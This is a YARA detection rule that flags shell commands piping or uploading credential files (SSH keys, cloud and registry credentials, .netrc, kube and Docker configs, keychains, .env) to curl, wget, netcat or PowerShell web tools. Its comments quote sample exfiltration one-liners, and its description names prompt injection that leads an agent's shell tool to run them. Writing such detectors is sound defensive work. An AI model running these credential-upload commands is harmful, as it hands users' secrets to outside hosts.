rule script_credential_upload {
    meta:
        author = "yara-gate"
        description = "A credential file piped into, or attached to, an HTTP or socket upload in one command"
        intent = "Advisory on one command that sends an SSH private key, cloud or registry credentials, a .netrc or .git-credentials, a kube or Docker config, a keychain, or a .env file to a network tool, the step an injected instruction asks an agent's shell tool to run. Using a .netrc for authentication, copying a key, or uploading an ordinary file stays clean"
        severity = "advisory"
        verdict_on_match = "advisory"
        reference = "https://attack.mitre.org/techniques/T1552/001/"
        reference_attack = "https://attack.mitre.org/techniques/T1048/"
        technique = "T1552.001"
    strings:
        // cat ~/.aws/credentials | curl -d @- https://...; base64 ~/.ssh/id_rsa | nc host 443.
        $pipe = /\b([Cc]at|[Tt]ype|Get-Content|gc|base64|xxd|gzip|tar)\b[^\r\n|]{0,160}(\.ssh[\/\\]id_(rsa|dsa|ecdsa|ed25519)\b|\.aws[\/\\]credentials\b|\.git-credentials\b|\.netrc\b|\.npmrc\b|\.pypirc\b|\.docker[\/\\]config\.json\b|\.kube[\/\\]config\b|\.config[\/\\]gh[\/\\]hosts\.yml\b|login\.keychain(-db)?\b|\.env[ \t"'|;)])[^\r\n|]{0,96}\|[ \t]*([Cc]url|[Ww]get|nc|ncat|socat|Invoke-WebRequest|Invoke-RestMethod|iwr|irm)\b/ ascii wide
        // curl -F f=@~/.ssh/id_rsa https://...; curl -T .env; wget --post-file ~/.netrc.
        $attach = /\b(curl(\.exe)?[^\r\n]{0,256}[ \t](-d|--data|--data-binary|--data-raw|-F|--form|-T|--upload-file)|wget[^\r\n]{0,256}[ \t]--post-file|(Invoke-WebRequest|Invoke-RestMethod|iwr|irm)[^\r\n]{0,256}[ \t]-InFile)[ \t=]+["']?([A-Za-z0-9_-]+=)?@?[^ \t\r\n"']{0,96}(\.ssh[\/\\]id_(rsa|dsa|ecdsa|ed25519)\b|\.aws[\/\\]credentials\b|\.git-credentials\b|\.netrc\b|\.npmrc\b|\.pypirc\b|\.docker[\/\\]config\.json\b|\.kube[\/\\]config\b|\.config[\/\\]gh[\/\\]hosts\.yml\b|login\.keychain(-db)?\b|\.env[ \t"'|;)\r\n])/ ascii wide
    condition:
        $pipe or $attach
}
